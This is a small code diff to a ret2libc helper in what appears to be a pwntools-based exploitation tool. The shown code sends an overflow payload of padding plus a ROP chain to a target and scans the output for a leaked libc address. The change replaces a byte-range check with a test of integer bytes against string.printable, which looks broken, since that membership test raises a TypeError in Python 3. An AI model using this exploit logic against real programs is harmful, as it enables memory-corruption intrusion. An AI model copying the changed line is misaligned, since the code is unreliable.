@@ -69,7 +69,7 @@ def try_ret2libc(setup: SetupFunction, offset: int, ret_addr: Optional[int] = No
             r.sendline(b"a" * offset + rop.chain())
             while True:
                 line = r.recvline(keepends=False)
-                if all(x <= 122 for x in line):
+                if all(x in string.printable for x in line):
                     continue
                 bits = 6 if context.bits == 64 else 4
                 leak = line[-bits:]
